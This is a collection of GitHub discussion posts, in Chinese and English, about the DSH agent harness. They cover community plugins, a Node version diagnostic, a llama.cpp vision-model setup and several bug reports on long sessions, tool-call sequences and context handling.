**中文**：DSH Remote —— 手机上的 DSH 控制台（安卓 App，Capacitor 混合应用）。会话 / 工具审批 / 提问 / goal / 文件互传（2GB 断点续传 + SHA-256 校验），局域网或 Tailscale 直连。插件自带网关随 DSH 自愈启停，Bearer token 鉴权，支持令牌二维码配对与一键轮换，多服务器测速自动切换，断线时历史离线可看。一条命令安装：`dsh plugin --profile web add dsh-remote-plugin`，APK 在 Releases。仓库：[Blank-not-black/dsh-Remote](https://github.com/Blank-not-black/dsh-Remote)（中英双语 README）

discussions.title: dsh-provider-auto: automatically add reasoning levels to custom provider models
discussions.body:
## dsh-provider-auto

A small DSH bundle plugin that restores the native reasoning-effort selector for recognized reasoning models served by custom OpenAI-compatible providers.

Repository: https://github.com/icekale/dsh-provider-auto
Recommended release: https://github.com/icekale/dsh-provider-auto/releases/tag/v0.1.1

### Why

`dsh-llm-pi-ai` correctly requires explicit `reasoningEfforts` metadata before exposing reasoning controls. Most OpenAI-compatible `/models` endpoints return model ids but no capability metadata, so hand-declared gateway models have no reasoning selector unless every model is configured manually.

### Behavior

- Watches the native `llm-pi-ai` settings section
- Adds `off / low / medium / high` only when `reasoningEfforts` is absent
- Recognizes `gpt-5*`, `o<number>*`, and `codex*` by default
- Skips image, audio, embedding, moderation, and reranking models
- Preserves all manual declarations
- Supports custom regex rules and wire-value mappings through Cordis config

### Install

```sh
dsh plugin --profile web add github:icekale/dsh-provider-auto#v0.1.1
```

Restart `dsh web` once after installation. Full English and Chinese configuration examples are included in the repository README.

### Scope

This plugin does not claim to implement arbitrary provider protocols or authentication. It only fills missing reasoning capability metadata for models already served through DSH adapters. The heuristic is configurable because OpenAI-compatible listing endpoints generally do not report reasoning levels.

The repository uses the official bundle manifest format, includes a minimal Node test, an MIT license, a tagged release, and the `dsh-plugin` topic.

discussions.title: Fix: clear diagnostic instead of cryptic ESM crashes on Node < 22.19
discussions.body:
## Problem

`npx @deepseek-ai/dsh web` on Node 20 installs without any warning — no published package declares `engines` — then crashes at profile boot with unrelated ESM errors:

- `The requested module 'node:zlib' does not provide an export named 'createZstdDecompress'`
- `Promise.withResolvers is not a function`
- `The requested module 'node:module' does not provide an export named 'stripTypeScriptTypes'`

The aggregate error blames random plugins (`dsh-session-persistence-jsonl`, `dsh-agent-loop`, `dsh-code-runtime-worker-thread`) instead of the real cause: the running Node is below the `^22.19.0 || >=24.0.0` floor that the repository's root manifest and CI already own.

## Fix

Implemented on my fork: https://github.com/1vk3y/deepseek-harness/tree/fix/unsupported-node-diagnostic

- `@deepseek-ai/dsh` declares `engines.node` (`^22.19.0 || >=24.0.0`, the root manifest's range), so npm/npx warn at install time.
- The CLI bin reads the same field from the checked-in manifest and, before parsing args or importing any profile code, exits 1 with:

  `dsh requires Node.js ^22.19.0 || >=24.0.0, but this process runs v20.14.0; install a supported Node.js version to run dsh.`

  Only the two range operators the manifest uses are parsed (`^X.Y.Z`, `>=X.Y.Z`, `||`-joined); unknown operators fail loud at load.
- A workspace-constraints gate pins `@deepseek-ai/dsh` `engines.node` to the root `engines.node` so the install-time declaration and the runtime guard cannot drift.
- `DSH_TEST_NODE_VERSION` substitutes `process.version` so built-bin acceptance tests exercise the failure path.
- Root + CLI READMEs name the Node requirement; a bilingual Agent Note records the decision.

## Verification

Unit tests pin caret/floor term boundaries, prerelease handling, and unknown-operator failures. A built-bin e2e test runs the published entry with `DSH_TEST_NODE_VERSION=v20.14.0` and asserts the diagnostic on stderr with no boot. Local gates run green: unit tests, built-bin e2e, source-launch compat, oxlint, knip, publint, workspace constraints, verify-export-jsdoc, agent-note format/classification, translation pairing (937 pairs), md-wrap, build+typecheck.

Happy to adapt this to whatever contribution process you prefer.

discussions.title: [Docs proposal] document the multi-frame zstd session-log container format
discussions.body:
**Proposal: document the session-log container format (concatenated zstd frames) in the official docs.**

**Why this matters**
The on-disk session artifact is a concatenated-frame zstd container, not a single zstd stream. This is load-bearing for the ecosystem but currently undocumented: the one-shot `zstdDecompressSync` (and the `zstd` CLI's naive single-frame paths) silently yield only the FIRST frame — the header line — and drop every event. Every community tool that reads historical sessions hits this wall independently.

**Evidence it is already biting**
- dsh-doctor's `log_health` check exists precisely because of this (frame scan + full decode; discussion #1719)
- dsh-report-studio's cross-session weekly (`report_week`) had to port `scanZstdFrames` from dsh-session-persistence-jsonl to read history
- dsh-trajectory (session → HTML trajectory) does the same
- the community tutorial documenting the pitfall: https://github.com/ciceroyang/dsh-report-studio/blob/main/docs/tutorial-zh.md (坑 6)

**The ask**
Add a short section to the session-persistence docs (or the architecture doc's Session log section) stating:
1. the artifact is a concatenation of independently decodable zstd frames
2. consumers must either scan frame boundaries structurally (the `scanZstdFrames` algorithm in dsh-session-persistence-jsonl/format.ts is the reference) or stream-decompress
3. one-shot decompressors stop at the first frame by design

One paragraph of docs saves every future session-tool author the same multi-hour debugging session. The reference algorithm already exists in the repo; this just makes it discoverable.

discussions.title: [分享] DSH + llama.cpp 本地跑 Qwen3.8-27B 视觉模型：图像被 does not declare image input 拦截的修复 + 4090 部署参数
discussions.body:
## 环境

- GPU: RTX 4090 24GB
- llama.cpp: b10430（Windows x64 CUDA 13 主包 + CUDA 13.3 DLLs）
- 模型: Qwen3.8-27B GGUF（下文以 Ridge 3.7bpw 混合量化为例）+ 配套 mmproj
- DSH: openai-completions 协议接 `http://127.0.0.1:8080/v1`

## 症状

llama-server 自带 WebUI 里拖图识别完全正常（说明服务端视觉链路 OK），但 DSH 里读图被拦，错误信息：

```
model "Qwen3.8-27B" does not declare image input
```

## 根因

DSH 的 read_image 有一道"能力闸门"：当前模型必须在配置里**显式声明支持图像输入**，才允许把图读进上下文。模型条目没写 `input` 时按纯文本处理——图片请求在 DSH 端就被拒掉，**根本不会发到 llama.cpp**，所以服务端毫无感知。

## 修复（就一行）

`~/.dsh/settings.yaml` 的模型条目加 `input: [text, image]`：

```yaml
        - id: Qwen3.8-27B
          name: Qwen3.8-27B 本地 128K
          contextWindow: 131072
          maxTokens: 32768
          input: [text, image]   # ← 就这一行
```

settings.yaml 有热加载 watcher，改完即生效，无需重启 DSH。

## llama.cpp 侧启动命令（视觉 + MTP + ngram，24GB 实测）

```cmd
llama-server ^
  --model Qwen3.8-27B-Ridge-3.7bpw.gguf ^
  --mmproj mmproj-Qwen3.8-27B-BF16.gguf ^
  --alias Qwen3.8-27B-Ridge ^
  --host 127.0.0.1 --port 8080 ^
  --ctx-size 131072 --parallel 1 ^
  --gpu-layers all --flash-attn on ^
  --cache-type-k q8_0 --cache-type-v q8_0 ^
  --spec-type draft-mtp,ngram-mod ^
  --spec-draft-n-max 6 --spec-draft-p-min 0.75 ^
  --spec-ngram-mod-n-match 24 --spec-ngram-mod-n-min 48 --spec-ngram-mod-n-max 64 ^
  --image-min-tokens 1024 ^
  --jinja --reasoning auto --reasoning-preserve ^
  --temp 1.0 --top-p 0.95 --top-k 20 ^
  --cache-prompt --cont-batching ^
  --fit off ^
  --log-file server.log
```

参数要点：

- `--image-min-tokens 1024`：服务器日志自荐参数。Qwen-VL 做 grounding（图上定位）任务时默认每图 576 token 精度不够，加这个保精度
- `--cache-type q8_0`：24GB 卡跑 27B 级权重的实测安全档；**f16 K @128K 会静默溢出到 CPU**，表现为长 prompt 处理速度断崖（实测 176→94→66 t/s 指纹），别踩
- `--spec-type draft-mtp,ngram-mod`：MTP + ngram 双草稿（Qwen3.8 自带 1 层 MTP，GGUF 里就有），实测草稿接受率 ~57%
- `--fit off`：显存不足时明确报错退出，而不是静默降配置

## DSH 模型配置的其他坑（openai-completions）

- `contextWindow` 按服务端 `--ctx-size` 的实际值填（本例 131072），别照抄云端模型的值
- `cost` 全填 0，本地不花钱，否则统计跑出天文数字
- **thinkingLevelMap 注意**：实测 b10430 的 llama-server 只认 `low / medium / high` 三档 `reasoning_effort`，不认 `xhigh` / `minimal`（DLL 字符串级验证）。Qwen3.8 默认思考深度是 xhigh，映射要写 `xhigh: 'high'` 而不是 `xhigh: 'xhigh'`，后者发过去就是 400
- 模型列表别写死：llama.cpp 换 GGUF / 改 alias 频繁，用 fetchModels 从 `/v1/models` 动态拉
- `reasoning_effort` 字段 b10430 原生支持，**不需要**加 `compat: { supportsReasoningEffort: false }`

## 验证

DSH 里发一张图，llama-server 日志随即出现 mtmd/clip 图像处理行——看到它就是整条链路通了。

## 性能参考（RTX 4090 + 上述参数）

Agent 编程场景实测：生成 82 tok/s、首 token 平均 0.8s、提示缓存命中 91%——`--cache-prompt` 在 Agent 每轮重发大上下文的场景下收益极大。

discussions.title: zai-coding-cn 模型缺少 glm-5.3：pi-ai 版本过旧（附已验证修复）
discussions.body:
## 现象

在模型设置里选择 provider `zai-coding-cn` 时，下拉的模型清单里没有 `glm-5.3`（也没有 `glm-5.2-highspeed`）。

## 根因

provider/model 的清单并不在这个仓库里，而是随 `@earendil-works/pi-ai` 包发布（`dist/providers/data/<provider>.json`），`dsh-llm-pi-ai` 在运行时通过 `getBuiltinModels` / `builtinProviders` 读取。pi-ai 是**外部运行时依赖**（没有打进 dsh 的 bundle），所以每个用户看到的清单 = 他实际装到的 pi-ai 版本。

仓库把 pi-ai 钉在 `^0.82.1`（`packages/llm/llm-pi-ai/package.json`），而 `glm-5.3` / `glm-5.2-highspeed` 是在 pi-ai `0.84.x` 才进入 `zai-coding-cn` 目录的。于是每个全新安装解析到的都是 0.82.1 的旧目录，**所有用户都看不到 glm-5.3**。`pnpm-workspace.yaml` 的注释本身也写道：pi-ai 新版"自带模型目录更新，这正是升级它的意义"——只是当前还停在 0.82.1。

## 影响

所有安装 dsh 的用户。

## 已验证的修复（供团队直接采用）

由于仓库暂不接受外部 PR（见 CONTRIBUTING），我把修复实现在 fork 上并完整验证：

- fork 分支：`hongliang-zhang/deepseek-harness` 的 `chore/bump-pi-ai-for-glm-5.3`
- commit：https://github.com/hongliang-zhang/deepseek-harness/commit/2cbd4dd48f

改动要点：
- `@earendil-works/pi-ai` `^0.82.1` → `^0.84.2`（同步 `minimumReleaseAgeExclude`）
- 处理 0.84 带来的类型漂移：
  - `thinkingFormat` 新增的 `baseten`（走 `chatTemplateArgs`，配置未暴露）→ 归入 `WithheldThinkingFormat`
  - `StopReason` 新增的 `pending` / `deferred`（merge-extensible）→ `mapStopReason` 增加 documented default
- 重新录制 provider 下拉快照（新增 `baseten`、`qwen-token-plan-individual`）
- 附 Agent Note（`implemented/process/2026-08-16-pi-ai-catalog-refresh-and-bump-drift.md`）

已验证：完整 `pnpm run typecheck` + `pnpm run build` 通过、`dsh-llm-pi-ai` 单测通过、web 快照 refresh + replay 稳定、note 的 format/classification gate 通过、pre-commit / pre-push hook 通过。

## 顺带一提

希望后续新模型能更快到达用户。两种方向（任选）：定期 bump pi-ai（现状机制，可加一个"pi-ai 落后上游"的 CI 提醒）；或让 provider 方自维护模型清单（如官方 zai 自己维护，而不是依赖 pi-ai 的快照）。欢迎讨论。

若本帖分类不合适，烦请团队移动；意在把问题和现成修复同步出来。

discussions.title: Bug 报告：长会话中模型思维链出现重复的感叹号
discussions.body:
[dsh-session-session-6e8d2365-5eb6-4e8a-91af-5a7851796870 (1).zip](https://github.com/user-attachments/files/31114513/dsh-session-session-6e8d2365-5eb6-4e8a-91af-5a7851796870.1.zip)



### 现象：
在长时间多轮对话后，模型内部思考（thinking）中开始大量重复单个字符"！"（出现形如 ！！！、**！！！** 的连续感叹号串），伴随重复的自我反问句式。回答内容本身仍正确，但思考过程退化，在用户可见的回复前思考会消耗大量上下文。
在大部分情况下，这种情况只是在词句之间出现。
但是极端情况下，后续的思维链全部被这种**","！！！","**"," **","！！！","**充斥导致无法正确思考，这种情况下，会导致harness页面开始卡顿，只有当用户手动结束，并且让其继续才能继续工作，且手动打断后再让他工作，后续也马上会出现一样的情况。
附件的Turn 15 · Step 4和Turn 16 · Step 19出现了这种极端情况

### 触发条件：
约 10+ 轮高强度调试对话后出现，期间涉及大量工具调用（PowerShell、文件编辑、反复构建测试）。当推理等级为High和Max的时候稳定触发此bug，当推理关闭时则一切正常。

### 推测：
可能是长上下文下生成概率坍缩到高重复字符模式（类似 repetition penalty 失效），或思维链长度超限后的退化路径。建议检查 thinking 输出的去重/多样性约束，或对思维链长度设上限并在超限时截断。

### 影响：
思考 token 浪费、阅读体验差；用户被迫中断工作流来纠正；出现问题的会话无法再继续使用

### 环境： 
windows 11 25H2; deepseek V4 flash max; 创造模式; Full access; Node v22.23.2; Chrome 151.0.7922.138

discussions.title: [Bug] 工具调用中断后留下断裂消息序列，后续所有轮次直接失败且新会话继承
discussions.body:
## 现象

工具调用失败/中断（或手动停止任务）之后，下一轮对话必失败，报错：

```
An assistant message with 'tool_calls' must be followed by tool messages responding to each 'tool_call_id'.
(insufficient tool messages following tool_calls message)
```

新开会话也照样报（历史里的断裂序列被带过去），只能彻底重启应用才能恢复。第一次遇到排查了很久。

## 复现路径

1. 让 agent 执行会调用工具的任务（查文件/跑命令）
2. 在模型已输出 tool_calls、工具还没返回时：手动停止任务（或工具执行超时/异常）
3. 下一轮发任何消息 → 直接报协议错误
4. 开新会话 → 同样报错

## 根因分析（查了会话存储确认）

会话历史留下断裂序列：assistant 声明了 tool_calls: [call_1, call_2]，但只有 call_1 的 tool 结果，call_2 缺失。OpenAI 协议要求每个 tool_call_id 必须有配对消息（失败也要写 error 结果）。**工具执行失败/中断时平台没有为未完成的 tool_call 补写错误结果**，断裂序列原样保存。

## 期望行为

1. 工具执行失败/超时/中断时，为每个已声明的 tool_call 补写配对消息（内容可为 error/取消说明）
2. 或会话保存时检测断裂序列自动清理/补全
3. 停止任务时对已发出的 tool_calls 统一补"已取消"结果

## 临时方案

我写了个本地插件兜底：每次消息发送前扫描历史，发现无配对的 tool_call_id 自动补 error 结果的 tool 消息，API 校验通过，不用重启。但这是绕开，根治还得平台保证配对完整性。

## 环境

DeepSeek Harness 桌面版（最新）· deepseek-v4-flash / deepseek-v4-pro · Windows 10

discussions.title: 上下文占满窗口时没有任何明确的用户提醒：不知道「输入上下文已满」，也没有 /compact、/clear 的引导
discussions.body:
### 场景
长会话进行到后半段，模型回复在末尾被掐断（或请求直接被拒）。页面上只出现一个「已停止」标记，或一条「已达到输出 token 上限 / 发送"继续"」的提示。用户并不知道真正的原因是**输入上下文窗口已经占满**，也不知道该用 `/compact` 压缩、`/clear`、或新建会话。发"继续"也解决不了——下一次请求依然超限。

### 现状（三个档位，要么静默、要么引导错误）
1. **请求直接被拒**（"This model's maximum context length is X tokens. However, you requested Y tokens…"）：`CONTEXT_WINDOW_EXCEEDED` 会被 `compaction-basic` 自动捕获并**自动压缩会话、重试**。好处是不用用户管，但没有一条用户可见的通知说明"刚才发生了一次自动压缩"——transcript 里只有一个 `CompactionItem` 标记。
2. **生成中途截断**（`finish_reason='length'`）：UI 渲染 turn-max-tokens 节点——「已达到输出 token 上限」「回答被截断，已有输出保留在对话中。发送"继续"可让模型接着输出。」这条提示只覆盖"输出 token 截断"；当真实原因是**输入上下文满**时，引导是错的（发"继续"无济于事）。
3. **中断/停止**：只有「已停止」标记（`message.stopped`），无原因、无下一步。

参考位置：
- 错误识别：`packages/llm/llm/src/error.ts`（`CONTEXT_WINDOW_EXCEEDED_CODE`）
- 自动压缩：`packages/compaction/compaction-basic/src/index.ts`
- 提示文案：`packages/client/ui-conversation/src/client/locales.ts`（`message.maxTokens` / `message.maxTokens.hint` / `message.stopped`）
- 上下文用量条：ContextMeter（"上下文已用 {percent}"）

### 建议改进
1. **区分停止原因并给正确的引导**：输出截断 → 保留"发送继续"；输入上下文满（或 ContextMeter 逼近上限时截断）→ 明确提示「上下文已满。用 `/compact` 压缩本会话，或 `/clear` / 新建会话」，最好带一键触发 `/compact`。
2. **自动压缩可见化**：发生自动压缩时给一条通知（如「上下文已满，已自动压缩并继续回复」）。
3. **提示与 ContextMeter 联动**：接近上限时提前提醒，而不是等被掐断。

### 为什么值得做
"上下文用尽"是长会话的必然终点，但当前它**不可感知**：用户看到的是"模型停了/报错了"，而不是"我的会话太长了，该压缩/清理了"。把终点变成可操作的提醒，能显著减少"模型是不是坏了"的困惑，也是长会话最基础的自救路径提示。

discussions.title: 长会话持续使用后 dsh web 后端 CPU 无界增长、整机冻结需强制重启（默认 web 组合禁用了压缩/截断护栏
discussions.body:
### 现象

在 2~4 vCPU 的虚拟机上运行 `dsh web`，**同一个会话**连续使用约 90 分钟后：node 后端（监听 3080）CPU 单调爬升直至占满全部核，随后整个虚拟机硬冻结（ssh、vmtools 均无响应），只能强制断电重启。4 核同样复现，仅推迟冻结时间。已排查 nginx 反代与宿主环境非根因。

关键实测数据（nginx access.log）：

```text
14:30:21 POST /api/session.history -> 200, 9,337,935 字节
00:00:23 POST /api/session.history -> 200, 9,833,955 字节（1 秒内重复拉取 2 次）
00:47:22 GET  /api/status/events    -> 200, 1,941,210 字节（单条 SSE 事件流）
```

会话历史一天内从 37KB 膨胀到 9.8MB，且每次页面刷新/断线重连都全量重拉、无缓存无增量。

### 复现步骤

1. 环境：2~4 vCPU 虚拟机（实测 VMware 客户机，Debian 13 / Linux 6.12，8GB），`npx @deepseek-ai/dsh web` 启动（0.1.0-rc.5；npm 0.1.0-rc.6 已对比构建产物，代码相同）；浏览器打开 Web UI；nginx 反代（3443 → 127.0.0.1:3080，`proxy_buffering off`、长超时，SSE/WS 直通）。
2. 浏览器保持 1~2 个标签页常开（维持 WS/SSE 长连接）。
3. 在**同一个会话**里持续对话约 60~90 分钟：每次 prompt 间隔 1~5 分钟，任务包含大工具输出（如 `read` 大文件、`bash` 输出长日志）。
4. 观察（浏览器 DevTools Network 或 nginx access.log + `top`/`mpstat`）：
   - `POST /api/session.history` 响应体随会话增长从 KB 级涨到数 MB，且每次刷新/重连全量重拉；
   - 监听 3080 的 node 后端 `%CPU` 随时间单调爬升、不回落，`si`（软中断）占比随之升高。
5. 约 90 分钟后（会话越长、工具输出越大越早）：CPU 占满 → SSH/界面无响应 → 只能强制重启；`journalctl` 显示日志中途戛然而止、无正常关机序列。
6. 4 核同样复现，仅推迟冻结时间（增长超线性，加核无法消除）。

### 疑似根因（供维护者核对，均在仓库代码中定位）

- `packages/core/agent-loop/src/invariant.ts:31-49`：每次模型调用（每个 step）对整段消息历史做两次全量 `JSON.stringify` 比较，成本 O(会话规模)，违背项目自身的增量派生设计；
- `packages/context/agent-instructions/src/index.ts:43-59`：每个 pre-step 对 `surface.nodes.toReversed()` 全量遍历（默认 agent-spine bundle 含此插件）；
- `packages/host/apiproxy/src/api-proxy.ts:805,292,744`（`historyPage`/`paginate`/`viewFor`）：每次 history 请求 O(N) 全量拷贝+扫描，最后 50 条消息经 `data: z.unknown()`（`packages/api/remotes/src/sessions.schema.ts:41`）逐字透传无截断；
- `packages/host/apiproxy/src/api-proxy.ts:3475-3494`（`events.mux`）：每个流式 token 独立成帧、每个连接各自重算 `viewFor()` + 各自 `JSON.stringify` → 小帧风暴（`si` 软中断的直接来源）；
- `packages/bundle/web-app/cordis.patch.yml:358-365`：默认 web 组合把 `compaction-basic`、`command-compact`、`tool-result-pruner`（8KB 截断）全部 `disabled: true`（base 层已挂载，`packages/bundle/base/cordis.patch.yml:284-290,360-361`），注释声称移至 preset 层，但仓库内无任何 preset/patch 将其挂回——默认 `dsh web` = 无自动压缩、无结果截断、无 `/compact` 命令。

### 版本核实

- npm 最新 `0.1.0-rc.6` 已实测：`agent-loop/lib/invariant.js:27-28`、`agent-instructions/lib/index.js:1061-1063,1200-1201`、`host-apiproxy` 的 `historyPage`/`z.unknown()` 均原样存在，**未修复**；`dsh-web-app` 等 bundle 未发布 npm，仓库 master（HEAD == origin/master）仍禁用守护项。
